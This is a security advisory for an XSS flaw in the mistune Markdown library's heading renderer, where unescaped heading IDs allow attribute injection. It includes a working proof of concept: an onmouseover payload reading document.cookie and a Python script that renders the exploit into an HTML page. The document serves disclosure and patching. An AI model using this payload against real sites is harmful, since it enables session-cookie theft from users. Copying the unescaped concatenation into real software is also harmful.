# [M] Mistune Heading ID Attribute has Injection XSS

## Summary
Severity: Medium
Advisory: GHSA-v87v-83h2-53w7
CVE: CVE-2026-44897
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-09
Source: https://github.com/advisories/GHSA-v87v-83h2-53w7
Type: github-advisory

## Affected
- PyPI: `mistune` — affected >=0 <3.2.1

## Details
## Summary
`HTMLRenderer.heading()` builds the opening `<hN>` tag by string-concatenating the `id` attribute value directly into the HTML — with no call to `escape()`, `safe_entity()`, or any other sanitisation function. A double-quote character `"` in the `id` value terminates the attribute, allowing an attacker to inject arbitrary additional attributes (event handlers, `src=`, `href=`, etc.) into the heading element.

The default TOC hook assigns safe auto-incremented IDs (`toc_1`, `toc_2`, …) that never contain user text. However, the `add_toc_hook()` API accepts a caller-supplied `heading_id` callback. Deriving heading IDs from the heading text itself — to produce human-readable slug anchors like `#installation` or `#getting-started` — is by far the most common real-world usage of this callback (every major documentation generator does this). When the callback returns raw heading text, an attacker who controls heading content can break out of the `id=` attribute.

## Details
**File:** `src/mistune/renderers/html.py`

```python
def heading(self, text: str, level: int, **attrs: Any) -> str:
    tag = "h" + str(level)
    html = "<" + tag
    _id = attrs.get("id")
    if _id:
        html += ' id="' + _id + '"'    # ← _id is never escaped
    return html + ">" + text + "</" + tag + ">\n"
```

The `text` body (line content) *is* escaped upstream by the inline token renderer, which is why `text` arrives as `&quot;` etc. But `_id` arrives as a raw string directly from whatever the `heading_id` callback returned — no escaping occurs at any point in the pipeline.

## PoC
**Step 1 — Establish the baseline (safe default IDs)**

The script creates a parser with `escape=True` and the default `add_toc_hook()` (no custom `heading_id` callback). The default hook generates sequential numeric IDs:

```python
md_safe = create_markdown(escape=True)
add_toc_hook(md_safe)          # default: heading_id produces toc_1, toc_2, …

bl_src = "## Introduction\n"
bl_out, _ = md_safe.parse(bl_src)
```

Output — ID is auto-generated, no user text appears in it:
```html
<h2 id="toc_1">Introduction</h2>
```

**Step 2 — Add the realistic trigger: a text-based `heading_id` callback**

Deriving an anchor ID from the heading text is the standard real-world pattern (slugifiers, `mkdocs`, `sphinx`, `jekyll` all do this). The PoC uses the simplest possible version — return the raw heading text unchanged — to show the vulnerability without any extra transformation:

```python
def raw_id(token, index):
    return token.get("text", "")   # returns raw heading text as the ID

md_vuln = create_markdown(escape=True)
add_toc_hook(md_vuln, heading_id=raw_id)
```

**Step 3 — Craft the exploit payload**

Construct a heading whose text contains a double-quote followed by an injected attribute:

```
## foo" onmouseover="alert(document.cookie)" x="
```

When `raw_id` is called, `token["text"]` is `foo" onmouseover="alert(document.cookie)" x="`. This is passed verbatim to `heading()` as the `id` attribute value.

**Step 4 — Observe attribute breakout in the output**

```python
ex_src = '## foo" onmouseover="alert(document.cookie)" x="\n'
ex_out, _ = md_vuln.parse(ex_src)
```

Actual output:
```html
<h2 id="foo" onmouseover="alert(document.cookie)" x="">foo&quot; onmouseover=&quot;alert(document.cookie)&quot; x=&quot;</h2>
```

Note: the heading **body text** is correctly escaped (`&quot;`), but the **`id=` attribute** is not. A user who moves their mouse over the heading triggers `alert(document.cookie)`. Any JavaScript payload can be substituted.

### Script 

A verification script was created to verify this issue. It creates a HTML page showing the bypass rendering in the browser.

```python
#!/usr/bin/env python3
"""H2: HTMLRenderer.heading() inserts the id= value verbatim — no escaping."""
import os, html as h
from mistune import create_markdown
from mistune.toc import add_toc_hook

def raw_id(token, index):
    return token.get("text", "")

# --- baseline ---
md_safe = create_markdown(escape=True)
add_toc_hook(md_safe)

bl_file = "baseline_h2.md"
bl_src  = "## Introduction\n"
with open(os.path.join(os.getcwd(), bl_file), "w") as f:
    f.write(bl_src)
bl_out, _ = md_safe.parse(bl_src)

print(f"[{bl_file}]\n{bl_src}")
print("[output — id=toc_1, no user content, safe]")
print(bl_out)

# --- exploit ---
md_vuln = create_markdown(escape=True)
add_toc_hook(md_vuln, heading_id=raw_id)

ex_file = "exploit_h2.md"
ex_src  = '## foo" onmouseover="alert(document.cookie)" x="\n'
with open(os.path.join(os.getcwd(), ex_file), "w") as f:
    f.write(ex_src)
ex_out, _ = md_vuln.parse(ex_src)

print(f"[{ex_file}]\n{ex_src}")
print("[output — heading_id returns raw text, id= not escaped]")
print(ex_out)

# --- HTML report ---
CSS = """
body{font-family:-apple-system,sans-serif;max-width:1200px;margin:40px auto;background:#f0f0f0;color:#111;padding:0 24px}
h1{font-size:1.3em;border-bottom:3px solid #333;padding-bottom:8px;margin-bottom:4px}
p.desc{color:#555;font-size:.9em;margin-top:6px}
.case{margin:24px 0;border-radius:8px;overflow:hidden;border:1px solid #ccc;box-shadow:0 1px 4px rgba(0,0,0,.1)}
.case-header{padding:10px 16px;font-weight:bold;font-family:monospace;font-size:.85em}
.baseline .case-header{background:#d1fae5;color:#065f46}
.exploit  .case-header{background:#fee2e2;color:#7f1d1d}
.panels{display:grid;grid-template-columns:1fr 1fr;background:#fff}
.panel{padding:16px}
.panel+.panel{border-left:1px solid #eee}
.panel h3{margin:0 0 8px;font-size:.68em;color:#888;text-transform:uppercase;letter-spacing:.07em}
pre{margin:0;padding:10px;background:#f6f6f6;border:1px solid #e0e0e0;border-radius:4px;font-size:.78em;white-space:pre-wrap;word-break:break-all}
.rlabel{font-size:.68em;color:#aaa;margin:10px 0 4px;font-family:monospace}
.rendered{padding:12px;border:1px dashed #ccc;border-radius:4px;min-height:20px;background:#fff;font-size:.9em}
"""

def case(kind, label, filename, src, out):
    return f"""
<div class="case {kind}">
  <div class="case-header">{'BASELINE' if kind=='baseline' else 'EXPLOIT'} — {h.escape(label)}</div>
  <div class="panels">
    <div class="panel">
      <h3>Input — {h.escape(filename)}</h3>
      <pre>{h.escape(src)}</pre>
    </div>
    <div class="panel">
      <h3>Output — HTML source</h3>
      <pre>{h.escape(out)}</pre>
      <div class="rlabel">↓ rendered in browser (hover the heading to trigger onmouseover)</div>
      <div class="rendered">{out}</div>
    </div>
  </div>
</div>"""

page = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>H2 — Heading ID XSS</title><style>{CSS}</style></head><body>
<h1>H2 — Heading ID XSS (unescaped id= attribute)</h1>
<p class="desc">HTMLRenderer.heading() in renderers/html.py does html += ' id="' + _id + '"' with no escaping.
Triggered when heading_id callback returns raw heading text — the most common doc-generator pattern.</p>
{case("baseline", "Clean heading → sequential id=toc_1, safe", bl_file, bl_src, bl_out)}
{case("exploit",  "Malicious heading → quotes break out of id=, onmouseover injected", ex_file, ex_src, ex_out)}
</body></html>"""

out_path = os.path.join(os.getcwd(), "report_h2.html")
with open(out_path, "w") as f:
    f.write(page)
print(f"\n[report] {out_path}")
```

Example Usage:
```bash
python poc.py
```

Once the script is run, open `report_h2.html` in the browser and observe the behaviour.

## Impact
| Dimension        | Assessment |
|------------------|-----------|
| **Confidentiality** | Session cookie / auth token theft via JavaScript execution triggered on mouse interaction |
| **Integrity**    | DOM manipulation, phishing content injection, forced navigation |
| **Availability** | Page freeze or crash available to attacker |

**Risk context:** This vulnerability targets the most common customisation point for heading IDs. Any documentation site, wiki, or blog engine that generates slug-style anchors from heading text is vulnerable if it uses mistune's `heading_id` callback without independently sanitising the returned value.

## References
- https://github.com/lepture/mistune/security/advisories/GHSA-v87v-83h2-53w7
- https://nvd.nist.gov/vuln/detail/CVE-2026-44897
- https://github.com/lepture/mistune
- https://github.com/lepture/mistune/releases/tag/v3.2.1
